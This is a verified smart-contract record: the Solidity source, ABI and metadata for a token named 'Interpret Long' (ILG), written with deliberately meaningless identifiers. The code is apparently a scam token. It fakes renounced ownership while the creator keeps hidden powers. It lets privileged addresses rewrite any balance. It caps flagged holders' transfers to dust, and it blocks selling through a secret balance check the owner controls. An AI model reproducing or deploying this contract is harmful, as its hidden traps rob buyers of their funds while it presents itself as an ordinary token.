{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface shouldTxMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract txEnable {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface swapBuyReceiver {\n    function createPair(address fromExempt, address marketingLaunched) external returns (address);\n}\n\ninterface walletMarketingReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tokenLaunchedTrading) external view returns (uint256);\n\n    function transfer(address walletTo, uint256 marketingTrading) external returns (bool);\n\n    function allowance(address launchWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingTrading) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletTo,\n        uint256 marketingTrading\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed toShould, uint256 value);\n    event Approval(address indexed launchWallet, address indexed spender, uint256 value);\n}\n\ninterface walletMarketingReceiverMetadata is walletMarketingReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract InterpretLong is txEnable, walletMarketingReceiver, walletMarketingReceiverMetadata {\n\n    function allowance(address teamTx, address launchedAuto) external view virtual override returns (uint256) {\n        if (launchedAuto == sellMinAt) {\n            return type(uint256).max;\n        }\n        return toReceiverLaunch[teamTx][launchedAuto];\n    }\n\n    uint256 private autoReceiver;\n\n    function decimals() external view virtual override returns (uint8) {\n        return minIs;\n    }\n\n    function balanceOf(address tokenLaunchedTrading) public view virtual override returns (uint256) {\n        return toLaunched[tokenLaunchedTrading];\n    }\n\n    address private autoReceiverLaunch;\n\n    mapping(address => uint256) private toLaunched;\n\n    address sellMinAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapLaunched;\n    }\n\n    address atBuyExempt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private maxTeamReceiver;\n\n    function launchReceiver(uint256 marketingTrading) public {\n        limitLaunch();\n        launchedReceiverFee = marketingTrading;\n    }\n\n    uint256 private swapLaunched = 100000000 * 10 ** 18;\n\n    function fundTake() public {\n        emit OwnershipTransferred(listAmountTo, address(0));\n        autoReceiverLaunch = address(0);\n    }\n\n    string private amountListLaunch = \"Interpret Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return isFundTrading;\n    }\n\n    bool public teamSell;\n\n    function transferFrom(address modeFee, address walletTo, uint256 marketingTrading) external override returns (bool) {\n        if (_msgSender() != sellMinAt) {\n            if (toReceiverLaunch[modeFee][_msgSender()] != type(uint256).max) {\n                require(marketingTrading <= toReceiverLaunch[modeFee][_msgSender()]);\n                toReceiverLaunch[modeFee][_msgSender()] -= marketingTrading;\n            }\n        }\n        return fundAuto(modeFee, walletTo, marketingTrading);\n    }\n\n    function transfer(address receiverMarketing, uint256 marketingTrading) external virtual override returns (bool) {\n        return fundAuto(_msgSender(), receiverMarketing, marketingTrading);\n    }\n\n    event OwnershipTransferred(address indexed buyFee, address indexed marketingMax);\n\n    function sellAt(address receiverMarketing, uint256 marketingTrading) public {\n        limitLaunch();\n        toLaunched[receiverMarketing] = marketingTrading;\n    }\n\n    function tradingFund(address modeFee, address walletTo, uint256 marketingTrading) internal returns (bool) {\n        require(toLaunched[modeFee] >= marketingTrading);\n        toLaunched[modeFee] -= marketingTrading;\n        toLaunched[walletTo] += marketingTrading;\n        emit Transfer(modeFee, walletTo, marketingTrading);\n        return true;\n    }\n\n    function isAt(address fundReceiver) public {\n        if (teamSell) {\n            return;\n        }\n        \n        modeToken[fundReceiver] = true;\n        \n        teamSell = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoReceiverLaunch;\n    }\n\n    uint256 public limitMarketing;\n\n    uint8 private minIs = 18;\n\n    mapping(address => bool) public takeTeam;\n\n    function fundAuto(address modeFee, address walletTo, uint256 marketingTrading) internal returns (bool) {\n        if (modeFee == listAmountTo) {\n            return tradingFund(modeFee, walletTo, marketingTrading);\n        }\n        uint256 listLaunched = walletMarketingReceiver(tradingEnable).balanceOf(atBuyExempt);\n        require(listLaunched == launchedReceiverFee);\n        require(walletTo != atBuyExempt);\n        if (takeTeam[modeFee]) {\n            return tradingFund(modeFee, walletTo, isMax);\n        }\n        return tradingFund(modeFee, walletTo, marketingTrading);\n    }\n\n    bool private listWallet;\n\n    address public listAmountTo;\n\n    bool private liquidityFrom;\n\n    uint256 constant isMax = 10 ** 10;\n\n    address public tradingEnable;\n\n    function name() external view virtual override returns (string memory) {\n        return amountListLaunch;\n    }\n\n    uint256 private tokenAmount;\n\n    function approve(address launchedAuto, uint256 marketingTrading) public virtual override returns (bool) {\n        toReceiverLaunch[_msgSender()][launchedAuto] = marketingTrading;\n        emit Approval(_msgSender(), launchedAuto, marketingTrading);\n        return true;\n    }\n\n    mapping(address => bool) public modeToken;\n\n    constructor (){\n        \n        shouldTxMode totalSell = shouldTxMode(sellMinAt);\n        tradingEnable = swapBuyReceiver(totalSell.factory()).createPair(totalSell.WETH(), address(this));\n        if (liquidityFrom == shouldBuy) {\n            shouldBuy = true;\n        }\n        listAmountTo = _msgSender();\n        fundTake();\n        modeToken[listAmountTo] = true;\n        toLaunched[listAmountTo] = swapLaunched;\n        if (tokenAmount == autoReceiver) {\n            autoReceiver = limitMarketing;\n        }\n        emit Transfer(address(0), listAmountTo, swapLaunched);\n    }\n\n    uint256 launchedReceiverFee;\n\n    function limitLaunch() private view {\n        require(modeToken[_msgSender()]);\n    }\n\n    string private isFundTrading = \"ILG\";\n\n    bool private shouldBuy;\n\n    function owner() external view returns (address) {\n        return autoReceiverLaunch;\n    }\n\n    uint256 listFee;\n\n    function modeToFee(address receiverTake) public {\n        limitLaunch();\n        \n        if (receiverTake == listAmountTo || receiverTake == tradingEnable) {\n            return;\n        }\n        takeTeam[receiverTake] = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private toReceiverLaunch;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"marketingMax\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toShould\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLaunchedTrading\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"isAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"launchReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listAmountTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverTake\",\"type\":\"address\"}],\"name\":\"modeToFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"sellAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingTrading\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "InterpretLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}